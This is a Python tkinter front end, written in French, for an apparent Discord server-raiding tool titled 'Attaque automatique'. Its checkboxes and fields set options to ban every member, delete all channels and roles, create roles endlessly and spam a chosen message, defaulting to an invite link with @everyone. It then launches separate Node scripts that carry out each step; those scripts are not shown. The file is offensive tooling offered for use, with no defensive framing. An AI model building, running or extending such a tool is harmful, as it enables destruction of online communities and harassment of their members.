from tkinter import *
from tkinter import ttk
import os
import json
import subprocess

root = Tk()
root.title('Attaque automatique')

atkl = LabelFrame(root, text='Configuration de l\'attaque', padx=5,pady=5)
atkl.pack()

ban = IntVar()
baneveryone = Checkbutton(atkl, text="Bannir tout le monde", variable=ban,
                 onvalue="1", width=30, offvalue="0", indicatoron=0)
baneveryone.pack(anchor=W)

value = StringVar()
value.set("Nouveau nom")
nvnom = Entry(atkl, textvariable=value, width=36)

value = StringVar()
value.set("Chemin ou URL de l'image")
nvimg = Entry(atkl, textvariable=value, width=36)

entree8 = IntVar()
dltchnl = Checkbutton(atkl, text="Supprimer tous les salons",
                 variable=entree8, onvalue="1", offvalue="0", width=30, indicatoron=0)
dltchnl.pack(anchor=W)

entree10 = IntVar()
e10 = Checkbutton(atkl, text="Supprimer tous les rôles",
                  variable=entree10, onvalue="1", offvalue="0", width=30, indicatoron=0)
e10.pack(anchor=W)

entree11 = IntVar()
e11 = Checkbutton(atkl, text="Créer des rôles à l'infini",
                  variable=entree11, onvalue="1", offvalue="0", width=30, indicatoron=0)
e11.pack(anchor=W)

value = StringVar()
value.set("Nom des salons à créer")
entree13 = Entry(atkl, textvariable=value, width=36)
entree13.pack(anchor=W)

value = StringVar()
value.set("Message à spammer dedans")
msg = Entry(atkl, textvariable=value, width=36)
msg.pack()


"""
    "config": {
        "msg": "https://discord.gg/ngrdmkN @everyone",
        "ban": "",
        "chnl_dlt": "",
        "admin": "",
        "role_dlt": "",
        "role_crt": "",
        "chnlname": "",
    },
"""

def attack():
    with open('core\\settings.json', 'r') as configfile:
        config = json.load(configfile)
    config["config"]["msg"] = msg.get()
    config["config"]["ban"] = ban.get()
    config["config"]["chnl_dlt"] = entree8.get()
    config["config"]["role_dlt"] = entree10.get()
    config["config"]["role_crt"] = entree11.get()
    config["config"]["chnlname"] = entree13.get()
    with open('core\\settings.json', 'w') as configfile:
        json.dump(config, configfile)
    atkl.pack_forget()
    atk.pack_forget()
    a = LabelFrame(root, text='Progression de l\'attaque', padx=20, pady=20)
    a.pack()

    action = StringVar()
    action.set('')

    progression = StringVar()
    progression.set(0)

    actionlabel = Label(a, textvariable=action)
    actionlabel.pack()

    p = ttk.Progressbar(a, orient=HORIZONTAL, length=400,
                        mode='determinate', variable=progression)
    p.pack()
    with open('core\\settings.json', 'r') as configfile:
        config = json.load(configfile)
    if config["config"]["role_dlt"] == 1:
        action.set('Suppression de tous les rôles...\nDurée : 10s')
        progression.set(5)
        root.update()
        subprocess.run('cd core\individuals && node role_dlt.js', shell=True)
        progression.set(10)
        action.set('Terminé.')
        root.update()
    if config["config"]["ban"] == 1:
        action.set('Bannissement de tous les membres...\nDurée : 15s')
        progression.set(15)
        root.update()
        subprocess.run('cd core\individuals && node ban.js', shell=True)
        progression.set(20)
        action.set('Terminé.')
        root.update()
    if config["config"]["chnl_dlt"] == 1:
        action.set('Suppression de tous les salons...\nDurée : 15s')
        progression.set(35)
        root.update()
        subprocess.run('cd core\individuals && node chnldlt.js', shell=True)
        progression.set(40)
        action.set('Terminé.')
        root.update()
    action.set('En train de spammer...\nDurée : Envoyez stop dans un des salons du serveur')
    progression.set(75)
    root.update()
    subprocess.run('cd core/pydiv && node auto.js', shell=True)
    action.set('Terminé. Vous pouvez fermer cette fenêtre.')
    progression.set(100)
    root.update()

atk = LabelFrame(root, text='Lancer', padx=5, pady=5)
atk.pack()

valid = Button(atk, text='Valider et lancer l\'attaque', command=lambda:attack(), width=30)
valid.pack()

root.mainloop()